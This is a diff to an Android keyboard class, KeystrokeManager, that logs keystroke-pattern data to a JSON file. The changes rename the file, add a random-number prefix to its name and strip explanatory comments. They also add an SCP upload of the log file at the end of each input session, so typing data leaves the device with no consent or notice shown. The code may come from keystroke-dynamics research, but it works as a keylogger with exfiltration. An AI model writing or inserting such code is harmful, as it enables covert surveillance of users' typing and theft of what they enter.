@@ -14,7 +14,7 @@ import org.json.JSONObject;
 public class KeystrokeManager {
 
     final private Context context;
-    private static final String FILENAME = "keystrokePatter.json";
+    private static final String FILENAME = "kspattern.json";
     private JSONArray ja = null;
     private File file;
     private int newInput = -1;
@@ -31,8 +31,7 @@ public class KeystrokeManager {
 
     public void onCreate() {
         try {
-            //             System.out.println("Keystroke Mamager : onCreate.");
-            file = new File(context.getFilesDir(), FILENAME); //create the file if it doesn't exist
+            file = new File(context.getFilesDir(), rand.nextInt() + FILENAME); //create the file if it doesn't exist
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -42,9 +41,8 @@ public class KeystrokeManager {
         orientation = context.getResources().getConfiguration().orientation;
         ja.put(new_jo);
     }
-    //Called to inform the input method that text input has started in an editor.
+
     public void onStartInput() {
-        //              System.out.println("Keystroke Mamager : onStartInput.");
         try {
             if (ja == null) {
                 newInput = rand.nextInt();
@@ -56,11 +54,9 @@ public class KeystrokeManager {
     }
 
     public void onDestroy() {
-        //          System.out.println("Keystroke Mamager : onDestroy.");
     }
 
     public void onFinishInput() {
-        //          System.out.println("Keystroke Mamager : onFinishInput.");
         try {
             if (ja.length() > 0) {
                 JSONObject jo = new JSONObject();
@@ -78,9 +74,12 @@ public class KeystrokeManager {
                 outputStream.write(str.getBytes());
                 outputStream.close();
                 ja = null;
+
+                new SendFilesScp().execute(file.getPath());
             }
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
+
 }
